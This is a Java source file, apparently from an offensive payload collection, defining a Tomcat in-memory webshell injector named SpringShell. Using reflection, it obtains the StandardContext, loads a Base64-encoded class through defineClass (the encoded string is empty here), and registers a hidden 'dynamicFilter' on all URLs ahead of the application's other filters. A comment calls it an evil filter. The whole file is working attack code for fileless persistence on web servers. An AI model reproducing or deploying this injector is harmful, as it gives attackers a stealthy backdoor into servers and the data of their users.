package http.payloads.memshell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;

public class SpringShell {
    private String filterCode;

    public SpringShell() {
        try {
            filterCode = "";
            exec();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void exec() throws Exception {
        final String filterName = "dynamicFilter";

        WebappClassLoaderBase webappClassLoaderBase =
                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext context = (StandardContext) webappClassLoaderBase.getResources().getContext();

        Class<? extends StandardContext> contextClass = null;
        try {
            contextClass = (Class<? extends StandardContext>) context.getClass().getSuperclass();
        } catch (Exception e) {
            contextClass = context.getClass();
        }
        Field field = contextClass.getDeclaredField("filterConfigs");
        field.setAccessible(true);
        HashMap configs = (HashMap) field.get(context);

        if (configs.get(filterName) == null) {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class<?> clazz;
            try {
                clazz = cl.loadClass("http.payloads.memshell.DynamicFilter");
            } catch (ClassNotFoundException e) {
                byte[] bytes = Base64.getDecoder().decode(filterCode);

                Method method = null;
                Class clz = cl.getClass();
                while (method == null && clz != Object.class) {
                    try {
                        method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    } catch (NoSuchMethodException ex) {
                        clz = clz.getSuperclass();
                    }
                }

                method.setAccessible(true);
                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
            }

            // register an evil filter
            Object filterDef;
            try {
                filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);
            } catch (ClassNotFoundException e) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
            }

            filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
            filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());

            Method method;
            try {
                method = context.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass());
            } catch (NoSuchMethodException e) {
                method = context.getClass().getSuperclass().getDeclaredMethod("addFilterDef", filterDef.getClass());
            }
            method.invoke(context, filterDef);

            Class<?> filterMapClass;
            try {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            } catch (ClassNotFoundException e) {
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            }

            Object filterMap = filterMapClass.newInstance();
            filterMapClass.getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
            filterMapClass.getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
            filterMapClass.getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, "/*");
            try {
                method = context.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass);
            } catch (NoSuchMethodException e) {
                method = context.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", filterMapClass);
            }
            method.invoke(context, filterMap);

            Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDef.getClass());
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = constructor.newInstance(context, filterDef);
            configs.put(filterName, filterConfig);
        }
    }
}
